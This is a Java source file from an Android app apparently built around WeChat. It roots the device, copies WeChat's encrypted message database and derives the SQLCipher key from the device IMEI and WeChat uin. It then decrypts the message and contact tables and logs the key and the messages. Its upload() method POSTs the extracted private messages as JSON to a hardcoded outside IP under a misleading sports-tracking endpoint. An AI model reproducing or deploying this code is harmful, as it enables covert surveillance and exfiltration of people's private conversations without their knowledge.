package moe.chionlab.wechatmomentstat.Model;

import android.content.Context;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.Gson;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import moe.chionlab.wechatmomentstat.Config;
import moe.chionlab.wechatmomentstat.Task;

/**
 * Created by chenjunfan on 2017/3/13.
 */

public class Manager31 {

    private Context context;
    private SQLiteDatabase db = null;
    private Cursor c = null;

    List<Map<String, Object>> recordList;

    public Manager31(Context context) {
        this.context = context;
    }

    public JSONObject getobj() {
        return null;
    }

    private String readDatabaseText() {

        Task task = new Task(context);
        task.testRoot();
        try {
            task.copyShared_prefs();
            task.copyEnDb();
        } catch (Throwable throwable) {
            throwable.printStackTrace();

        }

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        String uin = null;
        String password = null;
        Log.d("MymainActivity", "imei:" + imei);
        File sharepreFile = new File(Config.EXT_DIR + "/system_config_prefs.xml");
        try {
            FileInputStream is = new FileInputStream(sharepreFile);
            InputStreamReader isr = new InputStreamReader(is, "UTF-8");
            BufferedReader bfr = new BufferedReader(isr);
            String in = "";

            while ((in = bfr.readLine()) != null) {
                Log.d("MymainActivity", in);
                if (in.contains("default_uin")) {
                    String regEx = "[^0-9]";
                    Pattern p = Pattern.compile(regEx);
                    Matcher m = p.matcher(in);
                    uin = m.replaceAll("").trim();
                    Log.d("uin", uin);
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            Log.d("MymainActivity", "打开system_config_prefs.xml失败");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (uin != null) {


            password = Md5.getMd5(imei + uin).substring(0, 7);
            Log.d("password", password);


        }


        SQLiteDatabase.loadLibs(context);


        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;");
            }
        };

        recordList = new ArrayList<Map<String, Object>>();


        try {

            db = SQLiteDatabase.openOrCreateDatabase(Config.EXT_DIR + "/EnMicroMsg.db", password, null, hook);

            c = db.query("message", null, "msgId>=0 and msgId<=50", null, null, null, null);
            int i = 1;
            while (c.getCount() != 0) {
                while (c.moveToNext()) {
                    Map<String, Object> map = new HashMap<String, Object>();
                    int _id = c.getInt(c.getColumnIndex("msgId"));
                    String content = c.getString(c.getColumnIndex("content"));
                    String talker = c.getString(c.getColumnIndex("talker"));
                    String status = "" + c.getInt(c.getColumnIndex("status"));
                    String type = "" + c.getInt(c.getColumnIndex("type"));
                    String createTime = "" + c.getLong(c.getColumnIndex("createTime"));
                    if (!type.equals("1"))
                        continue;

                    map.put("sender", talker);
                    map.put("code", "0");
                    Map<String, String> data = new HashMap<String, String>();
                    data.put("text", content);
                    map.put("data", data);
                    map.put("timestamp", createTime);
                    map.put("order", _id + "");
                    if (status.equals("2")) {
                        map.put("name", "我");

                    } else {
                        map.put("name", "");
                    }
                    map.put("status", status);

                    recordList.add(map);
                    //Log.i("db", i+"_id=>" + _id +" talker=>"+talker+ ", content=>" + name);
                }
                c.close();
                c = db.query("message", null, "msgId>=" + i * 50 + " and msgId<=" + (i + 1) * 50, null, null, null, null);


                i++;

            }

            c.close();

            for (i = 0; i < recordList.size(); i++) {
                Map<String, Object> map = recordList.get(i);
                if (map.get("name").equals("我"))
                    continue;
                else {
                    c = db.query("rcontact", new String[]{"username", "nickname"}, "username=?", new String[]{map.get("sender").toString()}, null, null, null);

                    if (c.moveToNext()) {
                        //System.out.println("\n find \n");
                        map.remove("name");
                        map.put("name", c.getString(c.getColumnIndex("nickname")));
                        recordList.set(i, map);
                    }

//                    System.out.print("\n\n\n\n\n");
//                    while(c.moveToNext())
//                    {
//                        System.out.println(c.getString(c.getColumnIndex("username"))+c.getString(c.getColumnIndex("nickname")));
//                    }
//                    System.out.print("\n\n\n\n");
                    c.close();
                }

            }


            db.close();


        } catch (Exception e) {


        }


        for (int j = 0; j < recordList.size(); j++) {
            Map<String, Object> map = recordList.get(j);

            Log.d(j + " ", map.get("order") + " " + map.get("sender") + " " + map.get("name") + " " + map.get("content"));

        }
        Log.d("MymainActivity", "没有了");

        Gson gson = new Gson();
        String ret = gson.toJson(recordList);
        return ret;
    }

    public void upload() {

// TODO Auto-generated method stub
//        Looper.prepare();
        final String urlPath = "http://58.213.141.235:8080/qmjs_FEP/datewalk/createSportTrack.action";
        URL url;
        try {
            url = new URL(urlPath);
/*封装子对象*/

            String content = readDatabaseText();
            Log.d("update", content);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setDoOutput(true);//设置允许输出
            conn.setRequestMethod("POST");
            conn.setRequestProperty("User-Agent", "Fiddler");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Charset", "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(content.getBytes());
            os.close();
/*服务器返回的响应码*/

            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
            String retData = null;
            String responseData = "";
            while ((retData = in.readLine()) != null) {
                responseData += retData;
            }

            Toast.makeText(context, responseData, Toast.LENGTH_SHORT).show();


        } catch (Exception e) {
// TODO: handle exception
            throw new RuntimeException(e);
        }
//        Looper.loop();
    }


}
